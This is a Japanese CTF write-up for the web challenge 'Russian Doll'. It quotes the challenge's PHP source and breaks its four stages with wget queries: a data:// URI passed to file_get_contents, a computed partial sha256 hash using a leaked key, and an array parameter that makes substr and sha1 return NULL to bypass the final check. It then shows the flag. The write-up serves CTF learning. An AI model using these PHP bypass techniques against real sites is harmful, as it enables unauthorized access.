# Russian Doll:Web:15pts
This doll is tricky, can you pass all the stages and get the flag?  
I think you can!  
In Scope: http://web02.ctf313.com/  
Hack the web app only. You have the source code, no need to brute force or spam anything.  
Server and Infrastructure are out of scope and will result in an automatic ban and public shaming for being a 💩.  

# Solution
URLにアクセスするとphpソースが表示される。  
[BANGERS!](../BANGERS!)と同じく、段階的にロックを突破するようだ。  
Web02 Challenge "Russian Doll"  
[site.png](site/site.png)  
最初は以下の部分に注目する。  
```php
// Stage 1
$text = $_GET['text'];
if(@file_get_contents($text)!=="Привет хакер"){
        die("You must speak my language a different way!");
}

echo "Stage 1 is complete! You unlocked the key: " . $secretkey . "\n";
```
`file_get_contents`を呼んでいるので、データURIスキーム`data://text/plain,Привет хакер`を渡してやればよい。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://web02.ctf313.com/?text=data://text/plain,Привет хакер"
Stage 1 is complete! You unlocked the key: IThinkICanIThinkICanIThinkICan
хаха, это строго не сработает
```
次に以下の部分に注目する。  
```php
// Stage 2
$key1 = $_GET['key1'];
$keyId = 1337;

if (intval($key1) !== $keyId || $key1 === $keyId) {
    die("хаха, это строго не сработает");
}

echo "Stage 2 is complete! Keep Going!\n";
```
1337を入力したらよい。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://web02.ctf313.com/?text=data://text/plain,Привет хакер&key1=1337"
Stage 1 is complete! You unlocked the key: IThinkICanIThinkICanIThinkICan
Stage 2 is complete! Keep Going!
Ваш токен мертв, как и эта попытка
```
次に以下の部分に注目する。  
旧Stage 3は作問ミスらしい(数時間溶けた)。  
```php
// Stage 3
$hash = $_GET['hash'];
$token = intval($_GET['token']);

if(substr(hash("sha256", $keyId + $token . $secretkey), 5, 25) == $hash) {
    $keyId = $_GET['keyId'];
} else {
    die("Ваш токен мертв, как и эта попытка");
}

echo "Stage 3 is complete! You defeated death, for now...\n";
```
入力に`$secretkey`を付けたsha256ハッシュ値の、一部を当てればよい。  
`$secretkey`はStage 1で`IThinkICanIThinkICanIThinkICan`、`$keyId`はStage 2で`1337`と分かっている。  
以下のようにクエリを設定した。  
```bash
$ php -a
php > echo substr(hash("sha256", "1337" + "0" . "IThinkICanIThinkICanIThinkICan"), 5, 25);
bb6bcf1419dcdde482ff13f0f
php > quit
$ wget -q -O - "http://web02.ctf313.com/?text=data://text/plain,Привет хакер&key1=1337&token=0&hash=bb6bcf1419dcdde482ff13f0f"
Stage 1 is complete! You unlocked the key: IThinkICanIThinkICanIThinkICan
Stage 2 is complete! Keep Going!
Stage 3 is complete! You defeated death, for now...
ты не можешь сдаться сейчас!
```
最後に以下の部分に注目する。  
```php
// Final Stage
$key2 = 69;
if(substr($keyId, $key2) !== sha1($keyId)){
    die("ты не можешь сдаться сейчас!");
}

// Final Stage
echo "Final stage is complete Where da flag homie? 💩\n";
~~~
header("Content-Type: " . $flag);
```
配列を渡すと`substr`、`sha1`共にNULLが返ってくるため比較部分をバイパスできる。  
Content-Typeに隠されているようなので表示するオプションをつける。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://web02.ctf313.com/?text=data://text/plain,Привет хакер&key1=1337&token=0&hash=bb6bcf1419dcdde482ff13f0f&keyId[]=a" --server-response
  HTTP/1.1 200 OK
  Date: Fri, 04 Dec 2020 16:08:04 GMT
  Server: Apache/2.4.41 (Ubuntu)
  Content-Length: 209
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: flag{17H1nk1c4N17h1nK1c4N}
Stage 1 is complete! You unlocked the key: IThinkICanIThinkICanIThinkICan
Stage 2 is complete! Keep Going!
Stage 3 is complete! You defeated death, for now...
Final stage is complete Where da flag homie? 💩
```
flagが得られた。  

## flag{17H1nk1c4N17h1nK1c4N}